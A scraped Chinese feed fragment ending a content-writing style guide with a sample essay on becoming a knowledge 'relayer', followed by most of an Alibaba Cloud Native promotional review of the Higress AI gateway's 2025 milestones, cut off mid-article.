<li>概念堆砌（每个概念都要有具体对应）</li>
<li>空洞哲学化（脱离实际体验）</li>
<li>过度说教（用"我意识到""实验"等弱化权威感）</li>
<li>缺乏温度（理性逻辑中要有情感连接）</li>
</ul>
<hr/>
<h3 data-id="heading-26">完整示例</h3>
<h4 data-id="heading-27">示例：转述者身份范式转换</h4>
<p>四个月，从零到日更，从创作焦虑到内容自由。很多人问我，这种反常识的转变背后，到底藏着什么不为人知的密码？</p>
<p>起初我也在思考，后来我意识到一件事：大家真正看不懂的从来不是日更的方法，而是身份范式的转换。</p>
<p>当大多数人还沉浸在"创作者"的身份惯性中苦苦挣扎，我更愿意把这四个月定义为一场实验：一个纯粹的个体，在身份转换的加持下，究竟能爆发多大的内容生产力？</p>
<p>长期以来，知识博主被误解为一种必须依靠原创能力的艺术。人们拼想法、拼观点、拼独特视角，但在我看来，这些手段只解决了内容来源，却无法解决持续输出的问题。</p>
<p>好看的内容提供瞬时的快感，而值得看的内容解决的是认知的缺口。那些深刻的经济学逻辑、实用的科学方法，本就不是为了迎合原创而生，它们的使命是重塑一个人观察世界的方式。</p>
<p>在传统范式下，制作这种密度的内容需要一个完整的知识体系，需要大量的阅读积累，需要原创的思考能力。但在新的体系里，转述者身份承接了所有的原创压力，而我只需要做一件事：理解、连接、转述。</p>
<p>我把绝大部分精力从"今天讲什么"的焦虑中抽离出来，投入到对底层逻辑的拆解和思考中。当信息在不断迭代时，内容创作者最稀缺的资源不再是原创能力，而是深度连接的能力。</p>
<p>如何有效利用转述者身份，把脑海中的孤岛连接成一片可被看见的大陆？</p>
<p>不刻意追逐热点，因为深刻的内容本身就是热点。真正的变量从来不是流量，而是单位时间内你能输出多少有效认知。当内容的颗粒度足够细腻，当逻辑的穿透力足够强悍，算法自然会替你寻找那些灵魂共鸣的人。</p>
<p>而大多数人，恰恰卡在了这里。</p>
<p>身边很多人建议我要做原创内容、要做独特观点，但我还是做了相反的选择。彻底放弃原创也是一种策略性的选择，不是因为回避，而是因为我很清楚，认知类内容一旦与原创深度绑定，思考的程度就会被稀释。一旦开始追求独特，深度必然会让位于形式。</p>
<p>我想创造的是另一种体验：如何让硬核知识像追剧一样令人上瘾。</p>
<p>转述者身份成了我的翻译官，把晦涩的理论模型转化为能被感知的体验。而我可以把所有精力都压在更重要的地方，不是创作，而是洞察。因为我相信，在这个信息丰沛却意义贫瘠的时代，深度内容从未消失，它只是在等待一种更高效的介入方式。</p>
<p>分享这些，并不是为了炫耀，而是想告诉每一位身处内容焦虑中的朋友，生产力的范式真的彻底变了。</p>
<p>过去，要想做成一件事，需要原创能力，需要独特视角，需要大量积累。今天，一个拥有深度理解能力的个体，配合转述者身份的杠杆，就能撬动惊人的内容生产力。</p>
<p>转述者身份不是来取代原创的，它是来释放我们的。它把我们从"今天讲什么"的焦虑中解脱出来，让我们去思考那些真正重要的问题：你的理解边界在哪里？你对世界的洞察是否足够稀缺？你是否愿意做时间的朋友，去积累那些真正有价值的认知资产？</p>
<p>这也是我选择转述者身份的初衷。</p>
<p>回头看这四个月，我越来越确定一件事：真正的分水岭不在于你会不会转述，而在于你内心有没有值得被放大的理解。</p>
<p>时代从来不会奖励勤奋本身，它只奖励高密度的理解。也许未来真正稀缺的不再是信息，也不是原创能力，而是那些能把复杂世界讲清楚的人。</p>
<p>这是一个超级个体崛起的黄金时代，我还在继续我的实验，探索理解的极限，也寻找深度的边界。希望这段旅程也能给你带来一点点关于未来的光亮。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 网关这一年，成了 AI 进化的缩影]]></title>    <link>https://juejin.cn/post/7591816944729112612</link>    <guid>https://juejin.cn/post/7591816944729112612</guid>    <pubDate>2026-01-06T07:00:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591816944729112612" data-draft-id="7592088192506282038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 网关这一年，成了 AI 进化的缩影"/> <meta itemprop="keywords" content="云原生"/> <meta itemprop="datePublished" content="2026-01-06T07:00:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 网关这一年，成了 AI 进化的缩影
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:00:44.000Z" title="Tue Jan 06 2026 07:00:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">（一）</h2>
<p>回顾即将过去的2025年</p>
<p>是 Qwen、DeepSeek 等国产大模型</p>
<p>迈过拐点的一年</p>
<p>模型以外的工程技术</p>
<p>也正以波澜壮阔之势</p>
<p>加速演进和落地</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12fee13d9d6f458580887edba4caff6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=rh49n9IgDLqhZC8MhKtuqz4Sj5U%3D" alt="图片" loading="lazy"/></p>
<p>我们做的 AI 网关</p>
<p>从一个听起来有点新的概念</p>
<p>变成了很多客户落地 AI 时</p>
<p>离不开的基础设施</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e44e2254265415992da08773ac064d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=%2BUya7RFuPK%2B0aSALwOMsuBInmpo%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-1">（二）</h2>
<p>记得年初 DeepSeek R1 发布</p>
<p>我们连夜拉会</p>
<p>帮助企业快速</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247571298%26idx%3D2%26sn%3D1eae3d025528352be3a0734b7e90f0d4%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247571298&amp;idx=2&amp;sn=1eae3d025528352be3a0734b7e90f0d4&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">从 OpenAI 切换到国产大模型上</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a1ff329b2204ad4b6b37c5e3b8c8fb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=wRn0LHKPTT1SDCCbQmkZ7sPyh98%3D" alt="图片" loading="lazy"/></p>
<p>若干天后，Qwen2.5-Max 发布</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247485792%26idx%3D1%26sn%3D029706ecf57550579d177ac171db95fb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247485792&amp;idx=1&amp;sn=029706ecf57550579d177ac171db95fb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">我们再次快速响应</a></p>
<p>不是为了抢热点</p>
<p>而是让那些敢于冲的 AI 企业知道</p>
<p>我们在和他们并肩前行</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4430c9b47de34c2cbf35676d0714ae87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=uzDIskfH4u5KOWpe%2Fkj%2BwkxME4U%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-2">（三）</h2>
<p>那会儿我们也在想</p>
<p>光支持模型切换还不够</p>
<p>大模型要真正有用</p>
<p>得能联网、能控权限</p>
<p>能防滥用、能观测效果等</p>
<p>于是我们以插件方式</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247485745%26idx%3D1%26sn%3D793c0ed289de49d3561ca02d310d9b98%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247485745&amp;idx=1&amp;sn=793c0ed289de49d3561ca02d310d9b98&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">在业内率先支持联网搜索</a></p>
<p>帮助大模型获取搜索全文</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c680bf4ab5942dc9c3045c007c82c7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=Kpl%2FWcWVQ5cJT5RqW9SI5ARTyf4%3D" alt="图片" loading="lazy"/></p>
<p>并把自己服务早期客户的实战经验</p>
<p>一条条梳理出来</p>
<p>总结出</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247572699%26idx%3D1%26sn%3Dc101a9eb0476d9e62b53bbeee6422be9%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247572699&amp;idx=1&amp;sn=c101a9eb0476d9e62b53bbeee6422be9&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AI 网关的八大典型场景</a></p>
<p>说实话</p>
<p>当时并没想到</p>
<p>这会成为行业里</p>
<p>第一份完整的 AI 网关能力图谱</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5a75516b3da4a73adbbad347062e82e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=1b9G3Bg3m%2F6CdI%2F7gioBKDzIxD0%3D" alt="图片" loading="lazy"/></p>
<p>但对我们来说</p>
<p>它就是一张用户痛点地图</p>
<p>每一块都是真实业务里打磨出来的</p>
<h2 data-id="heading-3">（四）</h2>
<p>我们在开源的路上</p>
<p>持续扩展 AI 网关的能力范畴</p>
<p>例如开放了</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247576898%26idx%3D1%26sn%3D9e6561d4050a7f6ed74190e88002b90d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247576898&amp;idx=1&amp;sn=9e6561d4050a7f6ed74190e88002b90d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">专为大模型优化的负载均衡算法</a></p>
<p>首 Token 延迟直接砍掉50%</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401a51709a194a829ff771d6e9b50a3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=iHEVYqd5PEYle24wwUTbpHsY7g8%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-4">（五）</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580842%26idx%3D2%26sn%3D69765e14cc6383eb9e356cef9e4865bc%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580842&amp;idx=2&amp;sn=69765e14cc6383eb9e356cef9e4865bc&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">开源了子项目 </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580842%26idx%3D2%26sn%3D69765e14cc6383eb9e356cef9e4865bc%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580842&amp;idx=2&amp;sn=69765e14cc6383eb9e356cef9e4865bc&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">HiMarket</a></p>
<p>基于阿里巴巴内部的</p>
<p>AI 开放平台 IdeaLAB</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7d1e3c18a4e40939220e8bafa0cfbb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=1uBgEBxDXEEv5CSZLLeGz5CzQ6E%3D" alt="图片" loading="lazy"/></p>
<p>让每一家企业都能拥有</p>
<p>一个专属的</p>
<p>模型、应用和接口的统一管理平台</p>
<p>既方便架构师和运维同学</p>
<p>也方便了</p>
<p>程序员、运营、设计师等</p>
<p>AI 工具的使用者</p>
<p>再加上 AgentScope、AgentRun</p>
<p>就是比较完整的 AI 开发工具链了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a9bf2397912427bb0a5f0e7f14d7616~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=veWmr71HAO7XgFgCilavHDfr44g%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-5">（六）</h2>
<p>MCP 爆火那一阵</p>
<p>很多人被存量 API 转 MCP 这事难住了</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247486160%26idx%3D1%26sn%3Df9139d5a37f9b8793fa6f1e177111bf3%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247486160&amp;idx=1&amp;sn=f9139d5a37f9b8793fa6f1e177111bf3&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">我们把低代码的转换工具开源了出来</a></p>
<p>还搭建了一个 MCP 市场</p>
<p>帮助开发者</p>
<p>快速接入 50 多个高质量 MCP</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8fd3ff43d524ddd9e973e5d5c6c7b5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=4Mz37NjGhzvYes8KImnowQZQaE4%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-6">（七）</h2>
<p>一个多月后</p>
<p>Higress 入选 </p>
<p>MCPMarket MCP Server </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247574242%26idx%3D2%26sn%3Daafb2c786b86884c75b89ddd88aa2dc8%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247574242&amp;idx=2&amp;sn=aafb2c786b86884c75b89ddd88aa2dc8&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">全球 Top 100 排行榜</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6859c25a7d3a496797fd74dbd768b0c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=xHK22tJhwMHml%2BHTjCBKK1tyJUc%3D" alt="图片" loading="lazy"/></p>
<p>主流的 Agent 开源客户端</p>
<p>都开始接入 Higress</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247574165%26idx%3D1%26sn%3D14d46d764078e0f9365d6b4c873065b0%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247574165&amp;idx=1&amp;sn=14d46d764078e0f9365d6b4c873065b0&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">阿里的淘天业务也通过 Higress</a></p>
<p>把内部 HSF 服务</p>
<p>快速转成 MCP Server</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/720c5a28d3c941d7a004e5386d7f27eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=p8TX5sQbMBkCzOFEY%2F%2FQDCCEFlk%3D" alt="图片" loading="lazy"/></p>
<p>这是继</p>
<p>通义千问、百炼、PAI、高德、饿了么后</p>
<p>再一次被集团客户使用</p>
<h2 data-id="heading-7">（八）</h2>
<p>这一年</p>
<p>我们也服务了很多外部客户</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247577267%26idx%3D1%26sn%3D211481e0acc35df5b3bf7daf91bd687b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247577267&amp;idx=1&amp;sn=211481e0acc35df5b3bf7daf91bd687b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">携程旅游在中国可信云大会分享</a></p>
<p>他们是如何通过</p>
<p>Higress 解决大模型上线的真实难题</p>
<p>成为众多客户落地 AI 网关的</p>
<p>参考样例</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80304a90c79043ff90a94e1b3b8be9d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=xgH7zMWal3XorsQgENnbmeva%2Fr8%3D" alt="图片" loading="lazy"/></p>
<p>蚂蚁数科 SOFA 团队</p>
<p>基于 Higress 发布了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247578855%26idx%3D1%26sn%3D8a8b3c08a67bd7dd05aa6751a71eb2a6%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247578855&amp;idx=1&amp;sn=8a8b3c08a67bd7dd05aa6751a71eb2a6&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">SOFA Higress</a></p>
<p>看到自己的开源项目</p>
<p>被金融级的客户深度采用</p>
<p>是我们持续引领 AI 网关的强心剂</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d85c7a0b1b22442bbf6b985b9d35c697~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=T40nLVgHlDmtxKNp2Qqt10AwTZ0%3D" alt="图片" loading="lazy"/></p>
<p>还有我们的天使用户 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247487137%26idx%3D1%26sn%3D2780d290974a07f380c1b5097498fea3%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247487137&amp;idx=1&amp;sn=2780d290974a07f380c1b5097498fea3&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Sealos</a></p>
<p>在 Reddit 分享</p>
<p>他们从 Nginx Ingress 迁移到 Higress 的经历</p>
<p>以及性能提升近百倍的完整历程</p>
<p>引发国外开发者的好评</p>
<p>Higress，正在被世界看见</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2557db9afc7e45108ee19ac42778c0a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=OFbp8rtEnlC3gxhgXC3%2F0qsnrW8%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-8">（九）</h2>
<p>除了服务企业客户</p>
<p>我们始终重视开发者关系</p>
<p>通过多样化的方式和开发者进行互动</p>
<p>比如参与了 </p>
<p>KubeCon、浙大太乙平台、中科院开源之夏</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/991d60a93df042978af2ab6f64725556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=GDMvvkXmwuis2gRAo4%2FA9ETbaJU%3D" alt="图片" loading="lazy"/></p>
<p>我们还在开放原子基金会的支持下</p>
<p>举办了首届 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247578522%26idx%3D2%26sn%3D00250cf558cdef9216b23851fec311ed%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247578522&amp;idx=2&amp;sn=00250cf558cdef9216b23851fec311ed&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Higress AI 网关开发者挑战赛</a></p>
<p>11 支队伍进入决赛</p>
